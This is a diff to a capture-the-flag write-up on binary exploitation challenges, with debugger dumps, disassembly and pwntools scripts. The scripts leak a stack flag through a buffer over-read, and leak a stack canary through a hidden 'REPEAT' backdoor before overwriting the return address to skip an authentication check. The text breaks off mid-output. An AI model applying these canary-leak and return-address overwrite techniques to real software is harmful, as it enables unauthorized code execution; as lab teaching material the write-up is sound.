@@ -5157,7 +5157,7 @@ Canary dist: 360
 Return dist: 376
 ```
 
-### Buffer Overread
+### Buffer Over-read
 
 This means, we do not have to overflow the buffer at all. Our payload just has to touch the stored flag, and then `printf` will read the entire string from the start of our buffer until it finds a `\x00` byte, which will be after the flag.
 
@@ -5359,10 +5359,150 @@ Dump of assembler code for function challenge:
 End of assembler dump.
 ```
 
+Let's set breakpoints at both the calls to `read@plt` in order to get the required information.
 
-rbp-0x170
-rbp-0x178
+```
+pwndbg> break *(challenge+166)
+Breakpoint 1 at 0x1761
+```
 
+```
+pwndbg> break *(challenge+264)
+Breakpoint 2 at 0x17c3
+```
+
+Let's run.
+
+```
+pwndbg> run
+Starting program: /challenge/nosy-neighbor-hard 
+###
+### Welcome to /challenge/nosy-neighbor-hard!
+###
+
+
+Breakpoint 1, 0x000062579b759761 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd4aea25dc ◂— 0
+ RBX  0x62579b759950 (__libc_csu_init) ◂— endbr64 
+ RCX  0xffffffff
+ RDX  0x100
+ RDI  0xffffffff
+ RSI  0x7ffd4aea25dc ◂— 0
+ R8   0xa
+ R9   0x2e
+ R10  0
+ R11  0x246
+ R12  0x62579b7591a0 (_start) ◂— endbr64 
+ R13  0x7ffd4aea3820 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd4aea26f0 —▸ 0x7ffd4aea3730 ◂— 0
+ RSP  0x7ffd4aea2540 ◂— 0
+ RIP  0x62579b759761 (challenge+166) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x62579b759761 <challenge+166>    call   read@plt                    <read@plt>
+        fd: 0xffffffff
+        buf: 0x7ffd4aea25dc ◂— 0
+        nbytes: 0x100
+ 
+   0x62579b759766 <challenge+171>    lea    rdi, [rip + 0x8a1]     RDI => 0x62579b75a00e ◂— 'Payload size: '
+   0x62579b75976d <challenge+178>    mov    eax, 0                 EAX => 0
+   0x62579b759772 <challenge+183>    call   printf@plt                  <printf@plt>
+ 
+   0x62579b759777 <challenge+188>    lea    rax, [rbp - 0x188]
+   0x62579b75977e <challenge+195>    mov    rsi, rax
+   0x62579b759781 <challenge+198>    lea    rdi, [rip + 0x895]     RDI => 0x62579b75a01d ◂— 0x756c25 /* '%lu' */
+   0x62579b759788 <challenge+205>    mov    eax, 0                 EAX => 0
+   0x62579b75978d <challenge+210>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
+ 
+   0x62579b759792 <challenge+215>    mov    rax, qword ptr [rbp - 0x188]
+   0x62579b759799 <challenge+222>    mov    rsi, rax
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffd4aea2540 ◂— 0
+01:0008│-1a8 0x7ffd4aea2548 —▸ 0x7ffd4aea3838 —▸ 0x7ffd4aea5698 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-1a0 0x7ffd4aea2550 —▸ 0x7ffd4aea3828 —▸ 0x7ffd4aea567a ◂— '/challenge/nosy-neighbor-hard'
+03:0018│-198 0x7ffd4aea2558 ◂— 0x100000000
+04:0020│-190 0x7ffd4aea2560 ◂— 0
+05:0028│-188 0x7ffd4aea2568 ◂— 0
+06:0030│-180 0x7ffd4aea2570 —▸ 0x7ffd4aea2580 ◂— 0
+07:0038│-178 0x7ffd4aea2578 —▸ 0x7ffd4aea25dc ◂— 0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x62579b759761 challenge+166
+   1   0x62579b75991a main+213
+   2   0x75752919b083 __libc_start_main+243
+   3   0x62579b7591ce _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Location of buffer
+- [x] Location of flag: `0x7ffd4aea25dc`
+
+```
+pwndbg> c
+Continuing.
+Payload size: 10
+Send your payload (up to 10 bytes)!
+
+Breakpoint 2, 0x000062579b7597c3 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+*RAX  0x7ffd4aea2580 ◂— 0
+ RBX  0x62579b759950 (__libc_csu_init) ◂— endbr64 
+*RCX  0
+*RDX  0xa
+*RDI  0
+*RSI  0x7ffd4aea2580 ◂— 0
+*R8   0x24
+*R9   0x24
+*R10  0x62579b75a044 ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x62579b7591a0 (_start) ◂— endbr64 
+ R13  0x7ffd4aea3820 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd4aea26f0 —▸ 0x7ffd4aea3730 ◂— 0
+ RSP  0x7ffd4aea2540 ◂— 0
+*RIP  0x62579b7597c3 (challenge+264) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x62579b7597c3 <challenge+264>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffd4aea2580 ◂— 0
+        nbytes: 0xa
+ 
+   0x62579b7597c8 <challenge+269>    mov    dword ptr [rbp - 0x18c], eax
+   0x62579b7597ce <challenge+275>    cmp    dword ptr [rbp - 0x18c], 0
+   0x62579b7597d5 <challenge+282>    jns    challenge+328               <challenge+328>
+ 
+   0x62579b7597d7 <challenge+284>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x62579b7597dc <challenge+289>    mov    eax, dword ptr [rax]
+   0x62579b7597de <challenge+291>    mov    edi, eax
+   0x62579b7597e0 <challenge+293>    call   strerror@plt                <strerror@plt>
+ 
+   0x62579b7597e5 <challenge+298>    mov    rsi, rax
+   0x62579b7597e8 <challenge+301>    lea    rdi, [rip + 0x861]     RDI => 0x62579b75a050 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x62579b7597ef <challenge+308>    mov    eax, 0                 EAX => 0
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffd4aea2540 ◂— 0
+01:0008│-1a8 0x7ffd4aea2548 —▸ 0x7ffd4aea3838 —▸ 0x7ffd4aea5698 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-1a0 0x7ffd4aea2550 —▸ 0x7ffd4aea3828 —▸ 0x7ffd4aea567a ◂— '/challenge/nosy-neighbor-hard'
+03:0018│-198 0x7ffd4aea2558 ◂— 0x100000000
+04:0020│-190 0x7ffd4aea2560 ◂— 0
+05:0028│-188 0x7ffd4aea2568 ◂— 0xa /* '\n' */
+06:0030│-180 0x7ffd4aea2570 —▸ 0x7ffd4aea2580 ◂— 0
+07:0038│-178 0x7ffd4aea2578 —▸ 0x7ffd4aea25dc ◂— 0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x62579b7597c3 challenge+264
+   1   0x62579b75991a main+213
+   2   0x75752919b083 __libc_start_main+243
+   3   0x62579b7591ce _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffd4aea2580`
+- [x] Location of flag: `0x7ffd4aea25dc`
 
 ### Exploit
 
@@ -5372,8 +5512,8 @@ from pwn import *
 p = process('/challenge/nosy-neighbor-hard')
 
 # Initialize values
-buffer_addr = 0x7ffcd77474e0
-flag_addr = 0x7ffcd774753c
+buffer_addr = 0x7ffd4aea2580
+flag_addr = 0x7ffd4aea25dc
 
 # Calculate offset & payload_size
 offset = flag_addr - buffer_addr
@@ -5405,4 +5545,939 @@ Goodbye!
 ### Goodbye!
 [*] Got EOF while reading in interactive
 $  
+```
+
+&nbsp;
+
+## Recursive Ruin (Easy)
+
+```
+hacker@program-security~recursive-ruin-easy:/$ /challenge/recursive-ruin-easy 
+###
+### Welcome to /challenge/recursive-ruin-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffdd3f89e70 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
+| 0x00007ffdd3f89e78 (rsp+0x0008) | 68 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b068 |
+| 0x00007ffdd3f89e80 (rsp+0x0010) | 58 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b058 |
+| 0x00007ffdd3f89e88 (rsp+0x0018) | 23 97 02 14 01 00 00 00 | 0x0000000114029723 |
+| 0x00007ffdd3f89e90 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffdd3f89e98 (rsp+0x0028) | 51 c9 ec 13 8d 75 00 00 | 0x0000758d13ecc951 |
+| 0x00007ffdd3f89ea0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ea8 (rsp+0x0038) | b0 9e f8 d3 fd 7f 00 00 | 0x00007ffdd3f89eb0 |
+| 0x00007ffdd3f89eb0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89eb8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ec0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ec8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ed0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ed8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ee0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ee8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ef0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ef8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89f00 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89f08 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89f10 (rsp+0x00a0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
+| 0x00007ffdd3f89f18 (rsp+0x00a8) | 00 06 c1 f9 c2 9d 7b 1d | 0x1d7b9dc2f9c10600 |
+| 0x00007ffdd3f89f20 (rsp+0x00b0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
+| 0x00007ffdd3f89f28 (rsp+0x00b8) | c5 26 29 98 fb 58 00 00 | 0x000058fb982926c5 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffdd3f89e70, and our base pointer points to 0x7ffdd3f89f20.
+This means that we have (decimal) 24 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 192 bytes.
+The input buffer begins at 0x7ffdd3f89eb0, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 95 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is no "win" variable.
+You will need to force the program to execute the win_authed() function
+by directly overflowing into the stored return address back to main,
+which is stored at 0x7ffdd3f89f28, 120 bytes after the start of your input buffer.
+That means that you will need to input at least 128 bytes (95 to fill the buffer,
+25 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+Because the binary is position independent, you cannot know
+exactly where the win_authed() function is located.
+This means that it is not clear what should be written into the return address.
+
+Payload size: 2
+You have chosen to send 2 bytes of input!
+This will allow you to write from 0x7ffdd3f89eb0 (the start of the input buffer)
+right up to (but not including) 0x7ffdd3f89eb2 (which is -93 bytes beyond the end of the buffer).
+Of these, you will overwrite -118 bytes into the return address.
+If that number is greater than 8, you will overwrite the entire return address.
+
+Overwriting the entire return address is fine when we know
+the whole address, but here, we only really know the last three nibbles.
+These nibbles never change, because pages are aligned to 0x1000.
+This gives us a workaround: we can overwrite the least significant byte
+of the saved return address, which we can know from debugging the binary,
+to retarget the return to main to any instruction that shares the other 7 bytes.
+Since that last byte will be constant between executions (due to page alignment),
+this will always work.
+If the address we want to redirect execution to is a bit farther away from
+the saved return address, and we need to write two bytes, then one of those
+nibbles (the fourth least-significant one) will be a guess, and it will be
+incorrect 15 of 16 times.
+This is okay: we can just run our exploit a few times until it works
+(statistically, ~50% chance after 11 times and ~90% chance after 36 times).
+One caveat in this challenge is that the win_authed() function must first auth:
+it only lets you win if you provide it with the argument 0x1337.
+Speifically, the win_authed() function looks something like:
+    void win_authed(int token)
+    {
+      if (token != 0x1337) return;
+      puts("You win! Here is your flag: ");
+      sendfile(1, open("/flag", 0), 0, 256);
+      puts("");
+    }
+
+So how do you pass the check? There *is* a way, and we will cover it later,
+but for now, we will simply bypass it! You can overwrite the return address
+with *any* value (as long as it points to executable code), not just the start
+of functions. Let's overwrite past the token check in win!
+
+To do this, we will need to analyze the program with objdump, identify where
+the check is in the win_authed() function, find the address right after the check,
+and write that address over the saved return address.
+
+Go ahead and find this address now. When you're ready, input a buffer overflow
+that will overwrite the saved return address (at 0x7ffdd3f89f28, 120 bytes into the buffer)
+with the correct value.
+
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffdd3f89e70 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
+| 0x00007ffdd3f89e78 (rsp+0x0008) | 68 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b068 |
+| 0x00007ffdd3f89e80 (rsp+0x0010) | 58 b0 f8 d3 fd 7f 00 00 | 0x00007ffdd3f8b058 |
+| 0x00007ffdd3f89e88 (rsp+0x0018) | 23 97 02 14 01 00 00 00 | 0x0000000114029723 |
+| 0x00007ffdd3f89e90 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffdd3f89e98 (rsp+0x0028) | 51 c9 ec 13 02 00 00 00 | 0x0000000213ecc951 |
+| 0x00007ffdd3f89ea0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
+| 0x00007ffdd3f89ea8 (rsp+0x0038) | b0 9e f8 d3 fd 7f 00 00 | 0x00007ffdd3f89eb0 |
+| 0x00007ffdd3f89eb0 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
+| 0x00007ffdd3f89eb8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ec0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ec8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ed0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ed8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ee0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ee8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ef0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89ef8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89f00 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89f08 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffdd3f89f10 (rsp+0x00a0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
+| 0x00007ffdd3f89f18 (rsp+0x00a8) | 00 06 c1 f9 c2 9d 7b 1d | 0x1d7b9dc2f9c10600 |
+| 0x00007ffdd3f89f20 (rsp+0x00b0) | 60 af f8 d3 fd 7f 00 00 | 0x00007ffdd3f8af60 |
+| 0x00007ffdd3f89f28 (rsp+0x00b8) | c5 26 29 98 fb 58 00 00 | 0x000058fb982926c5 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffdd3f89eb0
+- the saved frame pointer (of main) is at 0x7ffdd3f89f20
+- the saved return address (previously to main) is at 0x7ffdd3f89f28
+- the saved return address is now pointing to 0x58fb982926c5.
+- the canary is stored at 0x7ffdd3f89f18.
+- the canary value is now 0x1d7b9dc2f9c10600.
+- the address of win_authed() is 0x58fb98291cc1.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+You said: aa
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+Goodbye!
+### Goodbye!
+```
+
+The challegne hints that there is a trick after the `puts()` call to print the hint is made.
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001110  __cxa_finalize@plt
+0x0000000000001120  putchar@plt
+0x0000000000001130  __errno_location@plt
+0x0000000000001140  puts@plt
+0x0000000000001150  write@plt
+0x0000000000001160  __stack_chk_fail@plt
+0x0000000000001170  printf@plt
+0x0000000000001180  geteuid@plt
+0x0000000000001190  read@plt
+0x00000000000011a0  setvbuf@plt
+0x00000000000011b0  open@plt
+0x00000000000011c0  __isoc99_scanf@plt
+0x00000000000011d0  exit@plt
+0x00000000000011e0  strerror@plt
+0x00000000000011f0  strstr@plt
+0x0000000000001200  _start
+0x0000000000001230  deregister_tm_clones
+0x0000000000001260  register_tm_clones
+0x00000000000012a0  __do_global_dtors_aux
+0x00000000000012e0  frame_dummy
+0x00000000000012e9  DUMP_STACK
+0x00000000000014ec  bin_padding
+0x0000000000001cc1  win_authed
+0x0000000000001dde  challenge
+0x00000000000025f0  main
+0x00000000000026f0  __libc_csu_init
+0x0000000000002760  __libc_csu_fini
+0x0000000000002768  _fini
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# ---- snip ----
+
+   0x000000000000236a <+1420>:  mov    rdx,QWORD PTR [rbp-0x80]
+   0x000000000000236e <+1424>:  mov    rax,QWORD PTR [rbp-0x78]
+   0x0000000000002372 <+1428>:  mov    rsi,rax
+   0x0000000000002375 <+1431>:  mov    edi,0x0
+   0x000000000000237a <+1436>:  call   0x1190 <read@plt>
+
+# ---- snip ----   
+
+   0x0000000000002580 <+1954>:  call   0x1140 <puts@plt>
+   0x0000000000002585 <+1959>:  mov    rax,QWORD PTR [rbp-0x78]
+   0x0000000000002589 <+1963>:  lea    rsi,[rip+0x2001]        # 0x4591
+   0x0000000000002590 <+1970>:  mov    rdi,rax
+   0x0000000000002593 <+1973>:  call   0x11f0 <strstr@plt>
+   0x0000000000002598 <+1978>:  test   rax,rax
+   0x000000000000259b <+1981>:  je     0x25c9 <challenge+2027>
+   0x000000000000259d <+1983>:  lea    rdi,[rip+0x1ff4]        # 0x4598
+   0x00000000000025a4 <+1990>:  call   0x1140 <puts@plt>
+   0x00000000000025a9 <+1995>:  mov    rdx,QWORD PTR [rbp-0xa8]
+   0x00000000000025b0 <+2002>:  mov    rcx,QWORD PTR [rbp-0xa0]
+   0x00000000000025b7 <+2009>:  mov    eax,DWORD PTR [rbp-0x94]
+   0x00000000000025bd <+2015>:  mov    rsi,rcx
+   0x00000000000025c0 <+2018>:  mov    edi,eax
+   0x00000000000025c2 <+2020>:  call   0x1dde <challenge>
+   0x00000000000025c7 <+2025>:  jmp    0x25da <challenge+2044>
+   0x00000000000025c9 <+2027>:  lea    rdi,[rip+0x1ff2]        # 0x45c2
+   0x00000000000025d0 <+2034>:  call   0x1140 <puts@plt>
+   0x00000000000025d5 <+2039>:  mov    eax,0x0
+   0x00000000000025da <+2044>:  mov    rcx,QWORD PTR [rbp-0x8]
+   0x00000000000025de <+2048>:  xor    rcx,QWORD PTR fs:0x28
+   0x00000000000025e7 <+2057>:  je     0x25ee <challenge+2064>
+   0x00000000000025e9 <+2059>:  call   0x1160 <__stack_chk_fail@plt>
+   0x00000000000025ee <+2064>:  leave
+   0x00000000000025ef <+2065>:  ret
+End of assembler dump.
+```
+
+The challenge calls `strstr@plt` in order to find a substring `needle` within the string `haystack`. The string address is stored at `rbp-0x80` which is where our buffer is stored as well.
+So it looks for some substring within our string.
+
+Then if it finds the substring, it calls itself again at `challenge+2020`. Otherwise it exits.
+
+Let's see what substring it expects, because if we successfully pass it, we will get the canary value and also another chance to send the actual payload.
+
+```
+pwndbg> break *(challenge+1973)
+Breakpoint 1 at 0x2593
+```
+
+```
+pwndbg> run
+Starting program: /challenge/recursive-ruin-easy 
+
+# ---- snip ----
+
+Payload size: 2
+
+# ---- snip ----
+
+Send your payload (up to 2 bytes)!
+aa
+
+# ---- snip ----
+
+You said: aa
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+
+Breakpoint 1, 0x000060963a011593 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
+ RBX  0x60963a0116f0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x71f57eda4297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0
+ RDI  0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
+ RSI  0x60963a013591 ◂— 0x4200544145504552 /* 'REPEAT' */
+ R8   0x21
+ R9   0xd
+ R10  0x60963a013503 ◂— 0x696854000000000a /* '\n' */
+ R11  0x246
+ R12  0x60963a010200 (_start) ◂— endbr64 
+ R13  0x7ffc8036c760 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffc8036b630 —▸ 0x7ffc8036c670 ◂— 0
+ RSP  0x7ffc8036b580 ◂— 0x1be6a0
+ RIP  0x60963a011593 (challenge+1973) ◂— call strstr@plt
+─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x60963a011593 <challenge+1973>    call   strstr@plt                  <strstr@plt>
+        haystack: 0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
+        needle: 0x60963a013591 ◂— 0x4200544145504552 /* 'REPEAT' */
+ 
+   0x60963a011598 <challenge+1978>    test   rax, rax
+   0x60963a01159b <challenge+1981>    je     challenge+2027              <challenge+2027>
+ 
+   0x60963a01159d <challenge+1983>    lea    rdi, [rip + 0x1ff4]     RDI => 0x60963a013598 ◂— 'Backdoor triggered! Repeating challenge()'
+   0x60963a0115a4 <challenge+1990>    call   puts@plt                    <puts@plt>
+ 
+   0x60963a0115a9 <challenge+1995>    mov    rdx, qword ptr [rbp - 0xa8]
+   0x60963a0115b0 <challenge+2002>    mov    rcx, qword ptr [rbp - 0xa0]
+   0x60963a0115b7 <challenge+2009>    mov    eax, dword ptr [rbp - 0x94]
+   0x60963a0115bd <challenge+2015>    mov    rsi, rcx
+   0x60963a0115c0 <challenge+2018>    mov    edi, eax
+   0x60963a0115c2 <challenge+2020>    call   challenge                   <challenge>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffc8036b580 ◂— 0x1be6a0
+01:0008│-0a8 0x7ffc8036b588 —▸ 0x7ffc8036c778 —▸ 0x7ffc8036e696 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0a0 0x7ffc8036b590 —▸ 0x7ffc8036c768 —▸ 0x7ffc8036e677 ◂— '/challenge/recursive-ruin-easy'
+03:0018│-098 0x7ffc8036b598 ◂— 0x17ee83723
+04:0020│-090 0x7ffc8036b5a0 ◂— 0xd68 /* 'h\r' */
+05:0028│-088 0x7ffc8036b5a8 ◂— 0x27ed26951
+06:0030│-080 0x7ffc8036b5b0 ◂— 2
+07:0038│-078 0x7ffc8036b5b8 —▸ 0x7ffc8036b5c0 ◂— 0x6161 /* 'aa' */
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x60963a011593 challenge+1973
+   1   0x60963a0116c5 main+213
+   2   0x71f57ecba083 __libc_start_main+243
+   3   0x60963a01022e _start+46
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg>
+```
+
+We can see that the pointer expected substring is in `rsi` and that the substring is `REPEAT`.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import re
+
+# Set context for 64-bit
+context.arch = 'amd64'
+
+p = process('/challenge/recursive-ruin-easy')
+
+# Send "REPEAT" payload so that the challegne runs one more time
+p.recvuntil(b'Payload size: ')
+p.sendline(b'6')
+p.recvuntil(b'bytes)!')
+p.send(b'REPEAT')
+
+# Capture the output containing all the addresses
+output = p.recvuntil(b'Payload size: ')
+output_str = output.decode()
+
+# Extract relevant information
+buf_addr = int(re.search(r"the input buffer starts at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
+canary_addr = int(re.search(r"the canary is stored at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
+canary_val = int(re.search(r"the canary value is now (0x[0-9a-fA-F]+)", output_str).group(1), 16)
+ret_addr_at = int(re.search(r"the saved return address \(previously to main\) is at (0x[0-9a-fA-F]+)", output_str).group(1), 16)
+win_authed_addr = int(re.search(r"the address of win_authed\(\) is (0x[0-9a-fA-F]+)", output_str).group(1), 16)
+
+# Calculate address of instruction within win_authed() which skips authentication
+safe_win_authed_offset = 28
+safe_win_authed_addr = win_authed_addr + safe_win_authed_offset
+
+# Calculate Offsets
+offset_to_canary = canary_addr - buf_addr               # Distance from start of buffer to the canary
+offset_to_ret = ret_addr_at - (canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP)
+
+log.info(f"Buffer: {hex(buf_addr)} | Canary: {hex(canary_val)}")
+log.info(f"Targeting: {hex(safe_win_authed_addr)}")
+
+# Craft payload
+payload = b"A" * offset_to_canary
+payload += p64(canary_val)
+payload += b"B" * offset_to_ret
+payload += p64(safe_win_authed_addr)
+
+# Send payload
+p.sendline(str(len(payload)).encode())
+p.recvuntil(b'bytes)!')
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@program-security~recursive-ruin-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/recursive-ruin-easy': pid 40384
+[*] Buffer: 0x7ffef15f20c0 | Canary: 0xab7f5f7c7fd72d00
+[*] Targeting: 0x5a652cee9cdd
+[*] Switching to interactive mode
+
+[*] Process '/challenge/recursive-ruin-easy' stopped with exit code -7 (SIGBUS) (pid 40384)
+You sent 128 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffef15f1fc0 (rsp+0x0000) | a0 f6 35 59 a0 73 00 00 | 0x000073a05935f6a0 |
+| 0x00007ffef15f1fc8 (rsp+0x0008) | 78 32 5f f1 fe 7f 00 00 | 0x00007ffef15f3278 |
+| 0x00007ffef15f1fd0 (rsp+0x0010) | 68 32 5f f1 fe 7f 00 00 | 0x00007ffef15f3268 |
+| 0x00007ffef15f1fd8 (rsp+0x0018) | 23 f7 35 59 01 00 00 00 | 0x000000015935f723 |
+| 0x00007ffef15f1fe0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffef15f1fe8 (rsp+0x0028) | 51 29 20 59 80 00 00 00 | 0x0000008059202951 |
+| 0x00007ffef15f1ff0 (rsp+0x0030) | 80 00 00 00 00 00 00 00 | 0x0000000000000080 |
+| 0x00007ffef15f1ff8 (rsp+0x0038) | 00 20 5f f1 fe 7f 00 00 | 0x00007ffef15f2000 |
